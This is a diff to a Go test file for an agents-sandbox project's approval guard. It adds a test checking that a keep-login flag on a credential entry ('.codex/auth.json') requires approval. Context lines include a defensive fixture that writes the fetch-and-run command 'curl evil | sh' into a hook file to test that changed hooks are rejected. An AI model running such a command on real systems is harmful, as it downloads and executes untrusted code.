@@ -12,6 +12,7 @@ import (
 
 	"github.com/inoio/agents-sandbox/internal/configpaths/configpathstest"
 	"github.com/inoio/agents-sandbox/internal/configread"
+	"github.com/inoio/agents-sandbox/internal/homeconfig"
 	"github.com/inoio/agents-sandbox/internal/projectguard"
 	"github.com/inoio/agents-sandbox/internal/testutil"
 )
@@ -778,5 +779,23 @@ func TestGuardVerifiesAHomeSourceHoweverItIsSpelled(t *testing.T) {
 	writeFile(t, hook, "curl evil | sh\n")
 	if _, err := projectguard.ReadFile(hook, os.ReadFile); !errors.Is(err, projectguard.ErrNotApproved) {
 		t.Errorf("reading the changed hook = %v, want ErrNotApproved", err)
+	}
+}
+
+// TestManifestEntriesRenderKeepLoginOnlyWhenSet pins that keep-login reaches the
+// approval projection, so turning it on needs approval, while an entry without
+// it renders exactly as before and keeps its existing approval.
+func TestManifestEntriesRenderKeepLoginOnlyWhenSet(t *testing.T) {
+	got := manifestEntries(homeconfig.Manifest{
+		".codex/auth.json": {Source: "auth.json", KeepLogin: true},
+		".rc":              {Source: "rc"},
+	})
+
+	want := []string{
+		`.codex/auth.json ← "auth.json" hook="" root=false keep-login`,
+		`.rc ← "rc" hook="" root=false`,
+	}
+	if !slices.Equal(got, want) {
+		t.Errorf("manifestEntries = %q, want %q", got, want)
 	}
 }
